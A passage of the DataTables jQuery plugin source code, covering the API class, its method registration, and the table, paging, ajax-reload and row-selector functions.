		settings._iDisplayStart = start;

	}

	

	

	function _fnRenderer( settings, type )

	{

		var renderer = settings.renderer;

		var host = DataTable.ext.renderer[type];

	

		if ( $.isPlainObject( renderer ) && renderer[type] ) {

			// Specific renderer for this type. If available use it, otherwise use

			// the default.

			return host[renderer[type]] || host._;

		}

		else if ( typeof renderer === 'string' ) {

			// Common renderer - if there is one available for this type use it,

			// otherwise use the default

			return host[renderer] || host._;

		}

	

		// Use the default

		return host._;

	}

	

	

	/**

	 * Detect the data source being used for the table. Used to simplify the code

	 * a little (ajax) and to make it compress a little smaller.

	 *

	 *  @param {object} settings dataTables settings object

	 *  @returns {string} Data source

	 *  @memberof DataTable#oApi

	 */

	function _fnDataSource ( settings )

	{

		if ( settings.oFeatures.bServerSide ) {

			return 'ssp';

		}

		else if ( settings.ajax || settings.sAjaxSource ) {

			return 'ajax';

		}

		return 'dom';

	}

	



	

	

	/**

	 * Computed structure of the DataTables API, defined by the options passed to

	 * `DataTable.Api.register()` when building the API.

	 *

	 * The structure is built in order to speed creation and extension of the Api

	 * objects since the extensions are effectively pre-parsed.

	 *

	 * The array is an array of objects with the following structure, where this

	 * base array represents the Api prototype base:

	 *

	 *     [

	 *       {

	 *         name:      'data'                -- string   - Property name

	 *         val:       function () {},       -- function - Api method (or undefined if just an object

	 *         methodExt: [ ... ],              -- array    - Array of Api object definitions to extend the method result

	 *         propExt:   [ ... ]               -- array    - Array of Api object definitions to extend the property

	 *       },

	 *       {

	 *         name:     'row'

	 *         val:       {},

	 *         methodExt: [ ... ],

	 *         propExt:   [

	 *           {

	 *             name:      'data'

	 *             val:       function () {},

	 *             methodExt: [ ... ],

	 *             propExt:   [ ... ]

	 *           },

	 *           ...

	 *         ]

	 *       }

	 *     ]

	 *

	 * @type {Array}

	 * @ignore

	 */

	var __apiStruct = [];

	

	

	/**

	 * `Array.prototype` reference.

	 *

	 * @type object

	 * @ignore

	 */

	var __arrayProto = Array.prototype;

	

	

	/**

	 * Abstraction for `context` parameter of the `Api` constructor to allow it to

	 * take several different forms for ease of use.

	 *

	 * Each of the input parameter types will be converted to a DataTables settings

	 * object where possible.

	 *

	 * @param  {string|node|jQuery|object} mixed DataTable identifier. Can be one

	 *   of:

	 *

	 *   * `string` - jQuery selector. Any DataTables' matching the given selector

	 *     with be found and used.

	 *   * `node` - `TABLE` node which has already been formed into a DataTable.

	 *   * `jQuery` - A jQuery object of `TABLE` nodes.

	 *   * `object` - DataTables settings object

	 *   * `DataTables.Api` - API instance

	 * @return {array|null} Matching DataTables settings objects. `null` or

	 *   `undefined` is returned if no matching DataTable is found.

	 * @ignore

	 */

	var _toSettings = function ( mixed )

	{

		var idx, jq;

		var settings = DataTable.settings;

		var tables = $.map( settings, function (el, i) {

			return el.nTable;

		} );

	

		if ( ! mixed ) {

			return [];

		}

		else if ( mixed.nTable && mixed.oApi ) {

			// DataTables settings object

			return [ mixed ];

		}

		else if ( mixed.nodeName && mixed.nodeName.toLowerCase() === 'table' ) {

			// Table node

			idx = $.inArray( mixed, tables );

			return idx !== -1 ? [ settings[idx] ] : null;

		}

		else if ( mixed && typeof mixed.settings === 'function' ) {

			return mixed.settings().toArray();

		}

		else if ( typeof mixed === 'string' ) {

			// jQuery selector

			jq = $(mixed);

		}

		else if ( mixed instanceof $ ) {

			// jQuery object (also DataTables instance)

			jq = mixed;

		}

	

		if ( jq ) {

			return jq.map( function(i) {

				idx = $.inArray( this, tables );

				return idx !== -1 ? settings[idx] : null;

			} ).toArray();

		}

	};

	

	

	/**

	 * DataTables API class - used to control and interface with  one or more

	 * DataTables enhanced tables.

	 *

	 * The API class is heavily based on jQuery, presenting a chainable interface

	 * that you can use to interact with tables. Each instance of the API class has

	 * a "context" - i.e. the tables that it will operate on. This could be a single

	 * table, all tables on a page or a sub-set thereof.

	 *

	 * Additionally the API is designed to allow you to easily work with the data in

	 * the tables, retrieving and manipulating it as required. This is done by

	 * presenting the API class as an array like interface. The contents of the

	 * array depend upon the actions requested by each method (for example

	 * `rows().nodes()` will return an array of nodes, while `rows().data()` will

	 * return an array of objects or arrays depending upon your table's

	 * configuration). The API object has a number of array like methods (`push`,

	 * `pop`, `reverse` etc) as well as additional helper methods (`each`, `pluck`,

	 * `unique` etc) to assist your working with the data held in a table.

	 *

	 * Most methods (those which return an Api instance) are chainable, which means

	 * the return from a method call also has all of the methods available that the

	 * top level object had. For example, these two calls are equivalent:

	 *

	 *     // Not chained

	 *     api.row.add( {...} );

	 *     api.draw();

	 *

	 *     // Chained

	 *     api.row.add( {...} ).draw();

	 *

	 * @class DataTable.Api

	 * @param {array|object|string|jQuery} context DataTable identifier. This is

	 *   used to define which DataTables enhanced tables this API will operate on.

	 *   Can be one of:

	 *

	 *   * `string` - jQuery selector. Any DataTables' matching the given selector

	 *     with be found and used.

	 *   * `node` - `TABLE` node which has already been formed into a DataTable.

	 *   * `jQuery` - A jQuery object of `TABLE` nodes.

	 *   * `object` - DataTables settings object

	 * @param {array} [data] Data to initialise the Api instance with.

	 *

	 * @example

	 *   // Direct initialisation during DataTables construction

	 *   var api = $('#example').DataTable();

	 *

	 * @example

	 *   // Initialisation using a DataTables jQuery object

	 *   var api = $('#example').dataTable().api();

	 *

	 * @example

	 *   // Initialisation as a constructor

	 *   var api = new $.fn.DataTable.Api( 'table.dataTable' );

	 */

	_Api = function ( context, data )

	{

		if ( ! (this instanceof _Api) ) {

			return new _Api( context, data );

		}

	

		var settings = [];

		var ctxSettings = function ( o ) {

			var a = _toSettings( o );

			if ( a ) {

				settings.push.apply( settings, a );

			}

		};

	

		if ( $.isArray( context ) ) {

			for ( var i=0, ien=context.length ; i<ien ; i++ ) {

				ctxSettings( context[i] );

			}

		}

		else {

			ctxSettings( context );

		}

	

		// Remove duplicates

		this.context = _unique( settings );

	

		// Initial data

		if ( data ) {

			$.merge( this, data );

		}

	

		// selector

		this.selector = {

			rows: null,

			cols: null,

			opts: null

		};

	

		_Api.extend( this, this, __apiStruct );

	};

	

	DataTable.Api = _Api;

	

	// Don't destroy the existing prototype, just extend it. Required for jQuery 2's

	// isPlainObject.

	$.extend( _Api.prototype, {

		any: function ()

		{

			return this.count() !== 0;

		},

	

	

		concat:  __arrayProto.concat,

	

	

		context: [], // array of table settings objects

	

	

		count: function ()

		{

			return this.flatten().length;

		},

	

	

		each: function ( fn )

		{

			for ( var i=0, ien=this.length ; i<ien; i++ ) {

				fn.call( this, this[i], i, this );

			}

	

			return this;

		},

	

	

		eq: function ( idx )

		{

			var ctx = this.context;

	

			return ctx.length > idx ?

				new _Api( ctx[idx], this[idx] ) :

				null;

		},

	

	

		filter: function ( fn )

		{

			var a = [];

	

			if ( __arrayProto.filter ) {

				a = __arrayProto.filter.call( this, fn, this );

			}

			else {

				// Compatibility for browsers without EMCA-252-5 (JS 1.6)

				for ( var i=0, ien=this.length ; i<ien ; i++ ) {

					if ( fn.call( this, this[i], i, this ) ) {

						a.push( this[i] );

					}

				}

			}

	

			return new _Api( this.context, a );

		},

	

	

		flatten: function ()

		{

			var a = [];

			return new _Api( this.context, a.concat.apply( a, this.toArray() ) );

		},

	

	

		join:    __arrayProto.join,

	

	

		indexOf: __arrayProto.indexOf || function (obj, start)

		{

			for ( var i=(start || 0), ien=this.length ; i<ien ; i++ ) {

				if ( this[i] === obj ) {

					return i;

				}

			}

			return -1;

		},

	

		iterator: function ( flatten, type, fn, alwaysNew ) {

			var

				a = [], ret,

				i, ien, j, jen,

				context = this.context,

				rows, items, item,

				selector = this.selector;

	

			// Argument shifting

			if ( typeof flatten === 'string' ) {

				alwaysNew = fn;

				fn = type;

				type = flatten;

				flatten = false;

			}

	

			for ( i=0, ien=context.length ; i<ien ; i++ ) {

				var apiInst = new _Api( context[i] );

	

				if ( type === 'table' ) {

					ret = fn.call( apiInst, context[i], i );

	

					if ( ret !== undefined ) {

						a.push( ret );

					}

				}

				else if ( type === 'columns' || type === 'rows' ) {

					// this has same length as context - one entry for each table

					ret = fn.call( apiInst, context[i], this[i], i );

	

					if ( ret !== undefined ) {

						a.push( ret );

					}

				}

				else if ( type === 'column' || type === 'column-rows' || type === 'row' || type === 'cell' ) {

					// columns and rows share the same structure.

					// 'this' is an array of column indexes for each context

					items = this[i];

	

					if ( type === 'column-rows' ) {

						rows = _selector_row_indexes( context[i], selector.opts );

					}

	

					for ( j=0, jen=items.length ; j<jen ; j++ ) {

						item = items[j];

	

						if ( type === 'cell' ) {

							ret = fn.call( apiInst, context[i], item.row, item.column, i, j );

						}

						else {

							ret = fn.call( apiInst, context[i], item, i, j, rows );

						}

	

						if ( ret !== undefined ) {

							a.push( ret );

						}

					}

				}

			}

	

			if ( a.length || alwaysNew ) {

				var api = new _Api( context, flatten ? a.concat.apply( [], a ) : a );

				var apiSelector = api.selector;

				apiSelector.rows = selector.rows;

				apiSelector.cols = selector.cols;

				apiSelector.opts = selector.opts;

				return api;

			}

			return this;

		},

	

	

		lastIndexOf: __arrayProto.lastIndexOf || function (obj, start)

		{

			// Bit cheeky...

			return this.indexOf.apply( this.toArray.reverse(), arguments );

		},

	

	

		length:  0,

	

	

		map: function ( fn )

		{

			var a = [];

	

			if ( __arrayProto.map ) {

				a = __arrayProto.map.call( this, fn, this );

			}

			else {

				// Compatibility for browsers without EMCA-252-5 (JS 1.6)

				for ( var i=0, ien=this.length ; i<ien ; i++ ) {

					a.push( fn.call( this, this[i], i ) );

				}

			}

	

			return new _Api( this.context, a );

		},

	

	

		pluck: function ( prop )

		{

			return this.map( function ( el ) {

				return el[ prop ];

			} );

		},

	

		pop:     __arrayProto.pop,

	

	

		push:    __arrayProto.push,

	

	

		// Does not return an API instance

		reduce: __arrayProto.reduce || function ( fn, init )

		{

			return _fnReduce( this, fn, init, 0, this.length, 1 );

		},

	

	

		reduceRight: __arrayProto.reduceRight || function ( fn, init )

		{

			return _fnReduce( this, fn, init, this.length-1, -1, -1 );

		},

	

	

		reverse: __arrayProto.reverse,

	

	

		// Object with rows, columns and opts

		selector: null,

	

	

		shift:   __arrayProto.shift,

	

	

		slice: function () {

			return new _Api( this.context, this );

		},

	

	

		sort:    __arrayProto.sort, // ? name - order?

	

	

		splice:  __arrayProto.splice,

	

	

		toArray: function ()

		{

			return __arrayProto.slice.call( this );

		},

	

	

		to$: function ()

		{

			return $( this );

		},

	

	

		toJQuery: function ()

		{

			return $( this );

		},

	

	

		unique: function ()

		{

			return new _Api( this.context, _unique(this) );

		},

	

	

		unshift: __arrayProto.unshift

	} );

	

	

	_Api.extend = function ( scope, obj, ext )

	{

		// Only extend API instances and static properties of the API

		if ( ! ext.length || ! obj || ( ! (obj instanceof _Api) && ! obj.__dt_wrapper ) ) {

			return;

		}

	

		var

			i, ien,

			struct,

			methodScoping = function ( scope, fn, struc ) {

				return function () {

					var ret = fn.apply( scope, arguments );

	

					// Method extension

					_Api.extend( ret, ret, struc.methodExt );

					return ret;

				};

			};

	

		for ( i=0, ien=ext.length ; i<ien ; i++ ) {

			struct = ext[i];

	

			// Value

			obj[ struct.name ] = struct.type === 'function' ?

				methodScoping( scope, struct.val, struct ) :

				struct.type === 'object' ?

					{} :

					struct.val;

	

			obj[ struct.name ].__dt_wrapper = true;

	

			// Property extension

			_Api.extend( scope, obj[ struct.name ], struct.propExt );

		}

	};

	

	

	// @todo - Is there need for an augment function?

	// _Api.augment = function ( inst, name )

	// {

	// 	// Find src object in the structure from the name

	// 	var parts = name.split('.');

	

	// 	_Api.extend( inst, obj );

	// };

	

	

	//     [

	//       {

	//         name:      'data'                -- string   - Property name

	//         val:       function () {},       -- function - Api method (or undefined if just an object

	//         methodExt: [ ... ],              -- array    - Array of Api object definitions to extend the method result

	//         propExt:   [ ... ]               -- array    - Array of Api object definitions to extend the property

	//       },

	//       {

	//         name:     'row'

	//         val:       {},

	//         methodExt: [ ... ],

	//         propExt:   [

	//           {

	//             name:      'data'

	//             val:       function () {},

	//             methodExt: [ ... ],

	//             propExt:   [ ... ]

	//           },

	//           ...

	//         ]

	//       }

	//     ]

	

	_Api.register = _api_register = function ( name, val )

	{

		if ( $.isArray( name ) ) {

			for ( var j=0, jen=name.length ; j<jen ; j++ ) {

				_Api.register( name[j], val );

			}

			return;

		}

	

		var

			i, ien,

			heir = name.split('.'),

			struct = __apiStruct,

			key, method;

	

		var find = function ( src, name ) {

			for ( var i=0, ien=src.length ; i<ien ; i++ ) {

				if ( src[i].name === name ) {

					return src[i];

				}

			}

			return null;

		};

	

		for ( i=0, ien=heir.length ; i<ien ; i++ ) {

			method = heir[i].indexOf('()') !== -1;

			key = method ?

				heir[i].replace('()', '') :

				heir[i];

	

			var src = find( struct, key );

			if ( ! src ) {

				src = {

					name:      key,

					val:       {},

					methodExt: [],

					propExt:   [],

					type:      'object'

				};

				struct.push( src );

			}

	

			if ( i === ien-1 ) {

				src.val = val;

				src.type = typeof val === 'function' ?

					'function' :

					$.isPlainObject( val ) ?

						'object' :

						'other';

			}

			else {

				struct = method ?

					src.methodExt :

					src.propExt;

			}

		}

	};

	

	_Api.registerPlural = _api_registerPlural = function ( pluralName, singularName, val ) {

		_Api.register( pluralName, val );

	

		_Api.register( singularName, function () {

			var ret = val.apply( this, arguments );

	

			if ( ret === this ) {

				// Returned item is the API instance that was passed in, return it

				return this;

			}

			else if ( ret instanceof _Api ) {

				// New API instance returned, want the value from the first item

				// in the returned array for the singular result.

				return ret.length ?

					$.isArray( ret[0] ) ?

						new _Api( ret.context, ret[0] ) : // Array results are 'enhanced'

						ret[0] :

					undefined;

			}

	

			// Non-API return - just fire it back

			return ret;

		} );

	};

	

	

	/**

	 * Selector for HTML tables. Apply the given selector to the give array of

	 * DataTables settings objects.

	 *

	 * @param {string|integer} [selector] jQuery selector string or integer

	 * @param  {array} Array of DataTables settings objects to be filtered

	 * @return {array}

	 * @ignore

	 */

	var __table_selector = function ( selector, a )

	{

		if ( $.isArray(selector) ) {

			return $.map( selector, function (item) {

				return __table_selector(item, a);

			} );

		}

	

		// Integer is used to pick out a table by index

		if ( typeof selector === 'number' ) {

			return [ a[ selector ] ];

		}

	

		// Perform a jQuery selector on the table nodes

		var nodes = $.map( a, function (el, i) {

			return el.nTable;

		} );

	

		return $(nodes)

			.filter( selector )

			.map( function (i) {

				// Need to translate back from the table node to the settings

				var idx = $.inArray( this, nodes );

				return a[ idx ];

			} )

			.toArray();

	};

	

	

	

	/**

	 * Context selector for the API's context (i.e. the tables the API instance

	 * refers to.

	 *

	 * @name    DataTable.Api#tables

	 * @param {string|integer} [selector] Selector to pick which tables the iterator

	 *   should operate on. If not given, all tables in the current context are

	 *   used. This can be given as a jQuery selector (for example `':gt(0)'`) to

	 *   select multiple tables or as an integer to select a single table.

	 * @returns {DataTable.Api} Returns a new API instance if a selector is given.

	 */

	_api_register( 'tables()', function ( selector ) {

		// A new instance is created if there was a selector specified

		return selector !== undefined && selector !== null ?

			new _Api( __table_selector( selector, this.context ) ) :

			this;

	} );

	

	

	_api_register( 'table()', function ( selector ) {

		var tables = this.tables( selector );

		var ctx = tables.context;

	

		// Truncate to the first matched table

		return ctx.length ?

			new _Api( ctx[0] ) :

			tables;

	} );

	

	

	_api_registerPlural( 'tables().nodes()', 'table().node()' , function () {

		return this.iterator( 'table', function ( ctx ) {

			return ctx.nTable;

		}, 1 );

	} );

	

	

	_api_registerPlural( 'tables().body()', 'table().body()' , function () {

		return this.iterator( 'table', function ( ctx ) {

			return ctx.nTBody;

		}, 1 );

	} );

	

	

	_api_registerPlural( 'tables().header()', 'table().header()' , function () {

		return this.iterator( 'table', function ( ctx ) {

			return ctx.nTHead;

		}, 1 );

	} );

	

	

	_api_registerPlural( 'tables().footer()', 'table().footer()' , function () {

		return this.iterator( 'table', function ( ctx ) {

			return ctx.nTFoot;

		}, 1 );

	} );

	

	

	_api_registerPlural( 'tables().containers()', 'table().container()' , function () {

		return this.iterator( 'table', function ( ctx ) {

			return ctx.nTableWrapper;

		}, 1 );

	} );

	

	

	

	/**

	 * Redraw the tables in the current context.

	 */

	_api_register( 'draw()', function ( paging ) {

		return this.iterator( 'table', function ( settings ) {

			if ( paging === 'page' ) {

				_fnDraw( settings );

			}

			else {

				if ( typeof paging === 'string' ) {

					paging = paging === 'full-hold' ?

						false :

						true;

				}

	

				_fnReDraw( settings, paging===false );

			}

		} );

	} );

	

	

	

	/**

	 * Get the current page index.

	 *

	 * @return {integer} Current page index (zero based)

	 *//**

	 * Set the current page.

	 *

	 * Note that if you attempt to show a page which does not exist, DataTables will

	 * not throw an error, but rather reset the paging.

	 *

	 * @param {integer|string} action The paging action to take. This can be one of:

	 *  * `integer` - The page index to jump to

	 *  * `string` - An action to take:

	 *    * `first` - Jump to first page.

	 *    * `next` - Jump to the next page

	 *    * `previous` - Jump to previous page

	 *    * `last` - Jump to the last page.

	 * @returns {DataTables.Api} this

	 */

	_api_register( 'page()', function ( action ) {

		if ( action === undefined ) {

			return this.page.info().page; // not an expensive call

		}

	

		// else, have an action to take on all tables

		return this.iterator( 'table', function ( settings ) {

			_fnPageChange( settings, action );

		} );

	} );

	

	

	/**

	 * Paging information for the first table in the current context.

	 *

	 * If you require paging information for another table, use the `table()` method

	 * with a suitable selector.

	 *

	 * @return {object} Object with the following properties set:

	 *  * `page` - Current page index (zero based - i.e. the first page is `0`)

	 *  * `pages` - Total number of pages

	 *  * `start` - Display index for the first record shown on the current page

	 *  * `end` - Display index for the last record shown on the current page

	 *  * `length` - Display length (number of records). Note that generally `start

	 *    + length = end`, but this is not always true, for example if there are

	 *    only 2 records to show on the final page, with a length of 10.

	 *  * `recordsTotal` - Full data set length

	 *  * `recordsDisplay` - Data set length once the current filtering criterion

	 *    are applied.

	 */

	_api_register( 'page.info()', function ( action ) {

		if ( this.context.length === 0 ) {

			return undefined;

		}

	

		var

			settings   = this.context[0],

			start      = settings._iDisplayStart,

			len        = settings.oFeatures.bPaginate ? settings._iDisplayLength : -1,

			visRecords = settings.fnRecordsDisplay(),

			all        = len === -1;

	

		return {

			"page":           all ? 0 : Math.floor( start / len ),

			"pages":          all ? 1 : Math.ceil( visRecords / len ),

			"start":          start,

			"end":            settings.fnDisplayEnd(),

			"length":         len,

			"recordsTotal":   settings.fnRecordsTotal(),

			"recordsDisplay": visRecords,

			"serverSide":     _fnDataSource( settings ) === 'ssp'

		};

	} );

	

	

	/**

	 * Get the current page length.

	 *

	 * @return {integer} Current page length. Note `-1` indicates that all records

	 *   are to be shown.

	 *//**

	 * Set the current page length.

	 *

	 * @param {integer} Page length to set. Use `-1` to show all records.

	 * @returns {DataTables.Api} this

	 */

	_api_register( 'page.len()', function ( len ) {

		// Note that we can't call this function 'length()' because `length`

		// is a Javascript property of functions which defines how many arguments

		// the function expects.

		if ( len === undefined ) {

			return this.context.length !== 0 ?

				this.context[0]._iDisplayLength :

				undefined;

		}

	

		// else, set the page length

		return this.iterator( 'table', function ( settings ) {

			_fnLengthChange( settings, len );

		} );

	} );

	

	

	

	var __reload = function ( settings, holdPosition, callback ) {

		// Use the draw event to trigger a callback

		if ( callback ) {

			var api = new _Api( settings );

	

			api.one( 'draw', function () {

				callback( api.ajax.json() );

			} );

		}

	

		if ( _fnDataSource( settings ) == 'ssp' ) {

			_fnReDraw( settings, holdPosition );

		}

		else {

			_fnProcessingDisplay( settings, true );

	

			// Cancel an existing request

			var xhr = settings.jqXHR;

			if ( xhr && xhr.readyState !== 4 ) {

				xhr.abort();

			}

	

			// Trigger xhr

			_fnBuildAjax( settings, [], function( json ) {

				_fnClearTable( settings );

	

				var data = _fnAjaxDataSrc( settings, json );

				for ( var i=0, ien=data.length ; i<ien ; i++ ) {

					_fnAddData( settings, data[i] );

				}

	

				_fnReDraw( settings, holdPosition );

				_fnProcessingDisplay( settings, false );

			} );

		}

	};

	

	

	/**

	 * Get the JSON response from the last Ajax request that DataTables made to the

	 * server. Note that this returns the JSON from the first table in the current

	 * context.

	 *

	 * @return {object} JSON received from the server.

	 */

	_api_register( 'ajax.json()', function () {

		var ctx = this.context;

	

		if ( ctx.length > 0 ) {

			return ctx[0].json;

		}

	

		// else return undefined;

	} );

	

	

	/**

	 * Get the data submitted in the last Ajax request

	 */

	_api_register( 'ajax.params()', function () {

		var ctx = this.context;

	

		if ( ctx.length > 0 ) {

			return ctx[0].oAjaxData;

		}

	

		// else return undefined;

	} );

	

	

	/**

	 * Reload tables from the Ajax data source. Note that this function will

	 * automatically re-draw the table when the remote data has been loaded.

	 *

	 * @param {boolean} [reset=true] Reset (default) or hold the current paging

	 *   position. A full re-sort and re-filter is performed when this method is

	 *   called, which is why the pagination reset is the default action.

	 * @returns {DataTables.Api} this

	 */

	_api_register( 'ajax.reload()', function ( callback, resetPaging ) {

		return this.iterator( 'table', function (settings) {

			__reload( settings, resetPaging===false, callback );

		} );

	} );

	

	

	/**

	 * Get the current Ajax URL. Note that this returns the URL from the first

	 * table in the current context.

	 *

	 * @return {string} Current Ajax source URL

	 *//**

	 * Set the Ajax URL. Note that this will set the URL for all tables in the

	 * current context.

	 *

	 * @param {string} url URL to set.

	 * @returns {DataTables.Api} this

	 */

	_api_register( 'ajax.url()', function ( url ) {

		var ctx = this.context;

	

		if ( url === undefined ) {

			// get

			if ( ctx.length === 0 ) {

				return undefined;

			}

			ctx = ctx[0];

	

			return ctx.ajax ?

				$.isPlainObject( ctx.ajax ) ?

					ctx.ajax.url :

					ctx.ajax :

				ctx.sAjaxSource;

		}

	

		// set

		return this.iterator( 'table', function ( settings ) {

			if ( $.isPlainObject( settings.ajax ) ) {

				settings.ajax.url = url;

			}

			else {

				settings.ajax = url;

			}

			// No need to consider sAjaxSource here since DataTables gives priority

			// to `ajax` over `sAjaxSource`. So setting `ajax` here, renders any

			// value of `sAjaxSource` redundant.

		} );

	} );

	

	

	/**

	 * Load data from the newly set Ajax URL. Note that this method is only

	 * available when `ajax.url()` is used to set a URL. Additionally, this method

	 * has the same effect as calling `ajax.reload()` but is provided for

	 * convenience when setting a new URL. Like `ajax.reload()` it will

	 * automatically redraw the table once the remote data has been loaded.

	 *

	 * @returns {DataTables.Api} this

	 */

	_api_register( 'ajax.url().load()', function ( callback, resetPaging ) {

		// Same as a reload, but makes sense to present it for easy access after a

		// url change

		return this.iterator( 'table', function ( ctx ) {

			__reload( ctx, resetPaging===false, callback );

		} );

	} );

	

	

	

	

	var _selector_run = function ( type, selector, selectFn, settings, opts )

	{

		var

			out = [], res,

			a, i, ien, j, jen,

			selectorType = typeof selector;

	

		// Can't just check for isArray here, as an API or jQuery instance might be

		// given with their array like look

		if ( ! selector || selectorType === 'string' || selectorType === 'function' || selector.length === undefined ) {

			selector = [ selector ];

		}

	

		for ( i=0, ien=selector.length ; i<ien ; i++ ) {

			// Only split on simple strings - complex expressions will be jQuery selectors

			a = selector[i] && selector[i].split && ! selector[i].match(/[\[\(:]/) ?

				selector[i].split(',') :

				[ selector[i] ];

	

			for ( j=0, jen=a.length ; j<jen ; j++ ) {

				res = selectFn( typeof a[j] === 'string' ? $.trim(a[j]) : a[j] );

	

				if ( res && res.length ) {

					out = out.concat( res );

				}

			}

		}

	

		// selector extensions

		var ext = _ext.selector[ type ];

		if ( ext.length ) {

			for ( i=0, ien=ext.length ; i<ien ; i++ ) {

				out = ext[i]( settings, opts, out );

			}

		}

	

		return _unique( out );

	};

	

	

	var _selector_opts = function ( opts )

	{

		if ( ! opts ) {

			opts = {};

		}

	

		// Backwards compatibility for 1.9- which used the terminology filter rather

		// than search

		if ( opts.filter && opts.search === undefined ) {

			opts.search = opts.filter;

		}

	

		return $.extend( {

			search: 'none',

			order: 'current',

			page: 'all'

		}, opts );

	};

	

	

	var _selector_first = function ( inst )

	{

		// Reduce the API instance to the first item found

		for ( var i=0, ien=inst.length ; i<ien ; i++ ) {

			if ( inst[i].length > 0 ) {

				// Assign the first element to the first item in the instance

				// and truncate the instance and context

				inst[0] = inst[i];

				inst[0].length = 1;

				inst.length = 1;

				inst.context = [ inst.context[i] ];

	

				return inst;

			}

		}

	

		// Not found - return an empty instance

		inst.length = 0;

		return inst;

	};

	

	

	var _selector_row_indexes = function ( settings, opts )

	{

		var

			i, ien, tmp, a=[],

			displayFiltered = settings.aiDisplay,

			displayMaster = settings.aiDisplayMaster;

	

		var

			search = opts.search,  // none, applied, removed

			order  = opts.order,   // applied, current, index (original - compatibility with 1.9)

			page   = opts.page;    // all, current

	

		if ( _fnDataSource( settings ) == 'ssp' ) {

			// In server-side processing mode, most options are irrelevant since

			// rows not shown don't exist and the index order is the applied order

			// Removed is a special case - for consistency just return an empty

			// array

			return search === 'removed' ?

				[] :

				_range( 0, displayMaster.length );

		}

		else if ( page == 'current' ) {

			// Current page implies that order=current and fitler=applied, since it is

			// fairly senseless otherwise, regardless of what order and search actually

			// are

			for ( i=settings._iDisplayStart, ien=settings.fnDisplayEnd() ; i<ien ; i++ ) {

				a.push( displayFiltered[i] );

			}

		}

		else if ( order == 'current' || order == 'applied' ) {

			if ( search == 'none') {

				a = displayMaster.slice();

			}

			else if ( search == 'applied' ) {

				a = displayFiltered.slice();

			}

			else if ( search == 'removed' ) {

				// O(n+m) solution by creating a hash map

				var displayFilteredMap = {};

	

				for ( var i=0, ien=displayFiltered.length ; i<ien ; i++ ) {

					displayFilteredMap[displayFiltered[i]] = null;

				}

	

				a = $.map( displayMaster, function (el) {

					return ! displayFilteredMap.hasOwnProperty(el) ?

						el :

						null;

				} );

			}

		}

		else if ( order == 'index' || order == 'original' ) {

			for ( i=0, ien=settings.aoData.length ; i<ien ; i++ ) {

				if ( search == 'none' ) {

					a.push( i );

				}

				else { // applied | removed

					tmp = $.inArray( i, displayFiltered );

	

					if ((tmp === -1 && search == 'removed') ||

						(tmp >= 0   && search == 'applied') )

					{

						a.push( i );

					}

				}

			}

		}

	

		return a;

	};

	

	

	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

	 * Rows

	 *

	 * {}          - no selector - use all available rows

	 * {integer}   - row aoData index

	 * {node}      - TR node

	 * {string}    - jQuery selector to apply to the TR elements

	 * {array}     - jQuery array of nodes, or simply an array of TR nodes

	 *

	 */

	var __row_selector = function ( settings, selector, opts )

	{

		var rows;

		var run = function ( sel ) {

			var selInt = _intVal( sel );

			var i, ien;

			var aoData = settings.aoData;

	

			// Short cut - selector is a number and no options provided (default is

			// all records, so no need to check if the index is in there, since it

			// must be - dev error if the index doesn't exist).

			if ( selInt !== null && ! opts ) {

				return [ selInt ];

			}

	

			if ( ! rows ) {

				rows = _selector_row_indexes( settings, opts );

			}

	

			if ( selInt !== null && $.inArray( selInt, rows ) !== -1 ) {

				// Selector - integer

				return [ selInt ];

			}

			else if ( sel === null || sel === undefined || sel === '' ) {

				// Selector - none

				return rows;

			}

	

			// Selector - function

			if ( typeof sel === 'function' ) {

				return $.map( rows, function (idx) {

					var row = aoData[ idx ];

					return sel( idx, row._aData, row.nTr ) ? idx : null;

				} );

			}

	

			// Selector - node

			if ( sel.nodeName ) {

				var rowIdx = sel._DT_RowIndex;  // Property added by DT for fast lookup

				var cellIdx = sel._DT_CellIndex;

	

				if ( rowIdx !== undefined ) {

					// Make sure that the row is actually still present in the table

					return aoData[ rowIdx ] && aoData[ rowIdx ].nTr === sel ?

						[ rowIdx ] :

						[];

				}

				else if ( cellIdx ) {

					return aoData[ cellIdx.row ] && aoData[ cellIdx.row ].nTr === sel.parentNode ?

						[ cellIdx.row ] :

						[];

				}

				else {

					var host = $(sel).closest('*[data-dt-row]');

					return host.length ?

						[ host.data('dt-row') ] :

						[];

				}

			}

	

			// ID selector. Want to always be able to select rows by id, regardless

			// of if the tr element has been created or not, so can't rely upon

			// jQuery here - hence a custom implementation. This does not match

			// Sizzle's fast selector or HTML4 - in HTML5 the ID can be anything,

			// but to select it using a CSS selector engine (like Sizzle or

			// querySelect) it would need to need to be escaped for some characters.

			// DataTables simplifies this for row selectors since you can select

			// only a row. A # indicates an id any anything that follows is the id -

			// unescaped.

			if ( typeof sel === 'string' && sel.charAt(0) === '#' ) {

				// get row index from id

				var rowObj = settings.aIds[ sel.replace( /^#/, '' ) ];

				if ( rowObj !== undefined ) {

					return [ rowObj.idx ];

				}

	

				// need to fall through to jQuery in case there is DOM id that

				// matches

			}

			

			// Get nodes in the order from the `rows` array with null values removed

			var nodes = _removeEmpty(

				_pluck_order( settings.aoData, rows, 'nTr' )

			);

	

			// Selector - jQuery selector string, array of nodes or jQuery object/

			// As jQuery's .filter() allows jQuery objects to be passed in filter,

			// it also allows arrays, so this will cope with all three options

			return $(nodes)

				.filter( sel )

				.map( function () {

					return this._DT_RowIndex;

				} )

				.toArray();

		};

	

		return _selector_run( 'row', selector, run, settings, opts );

	};

	

	

	_api_register( 'rows()', function ( selector, opts ) {

		// argument shifting

		if ( selector === undefined ) {

			selector = '';

		}

		else if ( $.isPlainObject( selector ) ) {

			opts = selector;

			selector = '';

		}

	

		opts = _selector_opts( opts );

	

		var inst = this.iterator( 'table', function ( settings ) {

			return __row_selector( settings, selector, opts );

		}, 1 );

	

		// Want argument shifting here and in __row_selector?

		inst.selector.rows = selector;

		inst.selector.opts = opts;

	

		return inst;

	} );

	

	_api_register( 'rows().nodes()', function () {

		return this.iterator( 'row', function ( settings, row ) {

			return settings.aoData[ row ].nTr || undefined;

		}, 1 );

	} );

	

	_api_register( 'rows().data()', function () {

		return this.iterator( true, 'rows', function ( settings, rows ) {

			return _pluck_order( settings.aoData, rows, '_aData' );

		}, 1 );

	} );

	

	_api_registerPlural( 'rows().cache()', 'row().cache()', function ( type ) {

		return this.iterator( 'row', function ( settings, row ) {

			var r = settings.aoData[ row ];

			return type === 'search' ? r._aFilterData : r._aSortData;

		}, 1 );

	} );

	

	_api_registerPlural( 'rows().invalidate()', 'row().invalidate()', function ( src ) {

